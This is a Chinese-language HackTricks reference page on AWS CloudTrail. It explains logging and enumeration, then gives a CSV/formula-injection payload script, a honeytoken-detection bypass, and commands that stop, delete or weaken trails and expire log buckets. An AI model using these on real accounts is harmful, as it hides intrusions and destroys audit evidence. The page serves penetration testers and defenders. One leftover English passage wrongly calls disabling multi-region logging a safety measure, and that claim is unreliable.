# AWS - CloudTrail枚举

<details>

<summary><strong>支持HackTricks并获得福利！</strong></summary>

* 如果您想在HackTricks中看到您的公司广告，或者如果您想访问PEASS的最新版本或下载PDF格式的HackTricks，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFT**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我的 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) **和** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github仓库提交PR来分享您的黑客技巧。**

</details>

## **CloudTrail**

该服务**跟踪和监控环境中的AWS API调用**。每个API调用（事件）都会被记录。每个记录的事件包含以下信息：

* 被调用的API名称：`eventName`
* 被调用的服务：`eventSource`
* 时间：`eventTime`
* IP地址：`SourceIPAddress`
* 代理方法：`userAgent`。例如：
* Signing.amazonaws.com - 来自AWS管理控制台
* console.amazonaws.com - 账户的根用户
* lambda.amazonaws.com - AWS Lambda
* 请求参数：`requestParameters`
* 响应元素：`responseElements`

事件会以**每5分钟左右的频率写入一个JSON文件的新日志文件**，由CloudTrail保存，并在大约15分钟后**将日志文件传送到S3**。\
CloudTrail的日志可以**跨账户和跨区域进行聚合**。\
CloudTrail允许使用**日志文件完整性**，以便能够验证您的日志文件自从CloudTrail将其交付给您以来是否未被更改。它会在摘要文件中创建日志的SHA-256哈希值。每小时会创建一次新日志的SHA-256哈希值。\
在创建Trail时，事件选择器将允许您指示要记录的Trail：管理、数据或洞察事件。

日志保存在S3存储桶中。默认情况下，使用服务器端加密（SSE-S3），因此AWS将为具有访问权限的人解密内容，但为了增加安全性，您可以使用SSE与KMS和自己的密钥。

### 日志文件命名约定

![](<../../../../.gitbook/assets/image (29).png>)

### S3文件夹结构

![](<../../../../.gitbook/assets/image (47).png>)

请注意，文件夹"_AWSLogs_"和"_CloudTrail_"是固定的文件夹名称，

**摘要**文件具有类似的文件夹路径：

![](<../../../../.gitbook/assets/image (22).png>)

### 聚合多个账户的日志

* 在您希望将日志文件传送到的AWS账户中创建一个Trail
* 为目标S3存储桶应用权限，允许CloudTrail进行跨账户访问，并允许每个需要访问的AWS账户
* 在其他AWS账户中创建一个新的Trail，并选择使用第1步中创建的存储桶

然而，即使您可以将所有日志保存在同一个S3存储桶中，也无法将来自多个账户的CloudTrail日志聚合到属于单个AWS账户的CloudWatch Logs中

### 将所有组织账户的CloudTrail聚合到一个账户中

在创建CloudTrail时，可以指示为组织中的所有账户激活CloudTrail，并将日志保存到一个桶中：

<figure><img src="../../../../.gitbook/assets/image (1) (1) (5).png" alt=""><figcaption></figcaption></figure>

这样，您可以轻松地在所有账户的所有区域中配置CloudTrail，并将日志集中在一个账户中（您应该保护该账户）。

### 检查日志文件

您可以通过运行以下命令来检查日志是否被篡改
```javascript
aws cloudtrail validate-logs --trail-arn <trailARN> --start-time <start-time> [--end-time <end-time>] [--s3-bucket <bucket-name>] [--s3-prefix <prefix>] [--verbose]
```
### 将日志发送到CloudWatch

**CloudTrail可以自动将日志发送到CloudWatch，这样您就可以设置警报，以在执行可疑活动时发出警告。**\
请注意，为了允许CloudTrail将日志发送到CloudWatch，需要创建一个允许此操作的**角色**。如果可能的话，建议使用AWS默认角色来执行这些操作。此角色将允许CloudTrail执行以下操作：

* CreateLogStream：允许创建CloudWatch Logs日志流
* PutLogEvents：将CloudTrail日志传递到CloudWatch Logs日志流

### 事件历史

CloudTrail事件历史允许您在表格中检查已记录的日志：

![](<../../../../.gitbook/assets/image (24).png>)

### 洞察

**CloudTrail Insights**自动**分析**来自CloudTrail跟踪的写入管理事件，并向您**发出警报**以检测异常活动。例如，如果`TerminateInstance`事件的增加与已建立的基线不同，您将看到它作为一个洞察事件。这些事件使**查找和响应异常API活动变得更加容易**。

### 安全性

| CloudTrail日志文件完整性        | <ul><li>验证日志是否被篡改（修改或删除）</li><li><p>使用摘要文件（为每个文件创建哈希）</p><ul><li>SHA-256哈希</li><li>SHA-256与RSA用于数字签名</li><li>由Amazon拥有的私钥</li></ul></li><li>创建摘要文件需要1小时（每小时整点进行）</li></ul> |
| ------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| 阻止未经授权的访问             | <ul><li><p>使用IAM策略和S3存储桶策略</p><ul><li>安全团队 —> 管理员访问</li><li>审计员 —> 只读访问</li></ul></li><li>使用SSE-S3/SSE-KMS对日志进行加密</li></ul>                                                                                                                                        |
| 防止日志文件被删除 | <ul><li>使用IAM和存储桶策略限制删除访问</li><li>配置S3 MFA删除</li><li>使用日志文件验证进行验证</li></ul>                                                                                                                                                                                            |

## 操作

### 枚举
```bash
# Get trails info
aws cloudtrail list-trails
aws cloudtrail describe-trails
aws cloudtrail list-public-keys
aws cloudtrail get-event-selectors --trail-name <trail_name>
aws [--region us-east-1] cloudtrail get-trail-status --name [default]

# Get insights
aws cloudtrail get-insight-selectors --trail-name <trail_name>

# Get data store info
aws cloudtrail list-event-data-stores
aws cloudtrail list-queries --event-data-store <data-source>
aws cloudtrail get-query-results --event-data-store <data-source> --query-id <id>
```
### **CSV注入**

在CloudTrail中，可以执行CSV注入，如果日志以CSV格式导出并在Excel中打开，将执行任意代码。\
以下代码将生成一个包含恶意负载的错误Trail名称的日志条目：
```python
import boto3
payload = "=cmd|'/C calc'|''"
client = boto3.client('cloudtrail')
response = client.create_trail(
Name=payload,
S3BucketName="random"
)
print(response)
```
有关CSV注入的更多信息，请查看页面：

{% embed url="https://book.hacktricks.xyz/pentesting-web/formula-injection" %}

有关此特定技术的更多信息，请查看[https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/](https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/)

## **避免被检测**

### HoneyTokens绕过

HoneyTokens被创建用于**检测敏感信息的外泄**。在AWS的情况下，它们是**被监控使用的AWS密钥**，如果有什么触发了使用该密钥的操作，那么肯定有人偷了那个密钥。

然而，这种监控是通过**CloudTrail**进行的，而有一些**AWS服务不会将日志发送到CloudTrail**（在[此处找到列表](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-unsupported-aws-services.html)）。其中一些服务将在未经授权的情况下（即honeytoken密钥）尝试访问时，**返回一个包含密钥角色的ARN的错误**。

这样，攻击者可以在不触发任何日志的情况下获取密钥的ARN。在ARN中，攻击者可以看到**AWS账户ID和名称**，很容易知道Honeytoken的公司账户ID和名称，因此攻击者可以确定该令牌是否为Honeytoken。

![](<../../../../.gitbook/assets/image (65).png>)

[**此脚本**](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-unsupported-aws-services.html)或[**Pacu**](https://github.com/RhinoSecurityLabs/pacu)可以检测一个密钥是否属于**Canarytokens**或**SpaceCrab**。

{% hint style="danger" %}
Pacu和脚本中使用的API**已被捕获**，因此您需要**找到一个新的**。\
要找到一个新的，您可以在[https://canarytokens.org/generate](https://canarytokens.org/generate)上生成一个canary token。
{% endhint %}

有关更多信息，请查看[**原始研究**](https://rhinosecuritylabs.com/aws/aws-iam-enumeration-2-0-bypassing-cloudtrail-logging/)。

### 删除跟踪
```bash
aws cloudtrail delete-trail --name [trail-name]
```
### 停止跟踪

To stop a trail, you can use the `stop-logging` command. This command will disable the logging of events for the specified trail.

```bash
aws cloudtrail stop-logging --name <trail-name>
```

要停止跟踪，您可以使用 `stop-logging` 命令。该命令将禁用指定跟踪的事件记录。

```bash
aws cloudtrail stop-logging --name <trail-name>
```
```bash
aws cloudtrail stop-logging --name [trail-name]
```
### 禁用多区域日志记录

To disable multi-region logging in AWS CloudTrail, follow these steps:

1. Open the AWS Management Console and navigate to the CloudTrail service.
2. Select the trail for which you want to disable multi-region logging.
3. Click on the "Edit" button.
4. In the "Advanced" section, locate the "Multi-Region" option.
5. Toggle the switch to the "Off" position to disable multi-region logging.
6. Click on the "Save" button to apply the changes.

By disabling multi-region logging, you ensure that CloudTrail logs are only stored in the region where the trail is created, reducing the risk of data leakage across multiple regions.
```bash
aws cloudtrail update-trail --name [trail-name] --no-is-multi-region --no-include-global-services
```
### 禁用事件选择器的日志记录

{% code overflow="wrap" %}
```bash
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[{"ReadWriteType": "ReadOnly"}]' --region <region>
```
{% endcode %}

在这个例子中，一个单独的事件选择器以一个JSON数组的形式提供，其中包含一个对象。`"ReadWriteType": "ReadOnly"` 表示事件选择器只捕获只读事件。您可以根据自己的特定要求自定义事件选择器。

### 通过S3生命周期策略删除日志

{% code overflow="wrap" %}
```bash
aws s3api put-bucket-lifecycle --bucket <bucket_name> --lifecycle-configuration '{"Rules": [{"Status": "Enabled", "Prefix": "", "Expiration": {"Days": 7}}]}' --region <region>
```
{% endcode %}

### 存储桶修改

* 删除S3存储桶
* 更改存储桶策略，拒绝来自CloudTrail服务的任何写入操作
* 向S3存储桶添加生命周期策略以删除对象
* 禁用用于加密CloudTrail日志的KMS密钥

### CloudTrail "勒索软件"

您可以**生成一个非对称密钥**，让**CloudTrail使用该密钥加密数据**，然后**删除私钥**，以便无法恢复CloudTrail内容。

![](https://lh6.googleusercontent.com/DRckYJKCAVyDeUY6cganqHTcfvlRMrOcnInUx25f9s9rstNvvkXbu-OS2ZozMvh0Oqxdc9Ehrsc8QJTVGZkbDih\_zsjU2KRvHVGahLqbfAhnD0VLdk096xPNJuAebOJYtDZ71SlnJt6rQj0\_3Q)

![](https://lh3.googleusercontent.com/GfGI0jCdTe2S2HNVMKdNaltBfv9ls6lZqSQt1FkR8mgcxKNdvVmAE2vl77Sr23KWJ6X7-X4UJVgkN5KsQxYEdqOTIWwjr6DHCK9s\_iw5whQkN\_TVPOycc2qHZUSU9NED\_k2lEYK4SpavbTxZ6w)

![](https://lh5.googleusercontent.com/Y9iLLB5RtmBoBVrLE9GKkGK6mxGWtAL6oSwVxgwqYxYHkXpimUZJmAT\_AkxQW-hpdz2kaHpaqXXHwvzz3osg-JA5i1c8\_bWoz5HlTj0mup0MAvG6B5IAnnsnvIDtpqflW4UzIOKZYDxxdxUSDQ)

## **参考资料**

* [https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory](https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory)

<details>

<summary><strong>支持HackTricks并获得福利！</strong></summary>

* 如果您希望在HackTricks中看到您的**公司广告**，或者如果您想访问**PEASS的最新版本或下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* 发现我们的独家[**NFT收藏品**](https://opensea.io/collection/the-peass-family)——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向**[**HackTricks**](https://github.com/carlospolop/hacktricks) **和**[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github仓库提交PR来分享您的黑客技巧。**

</details>
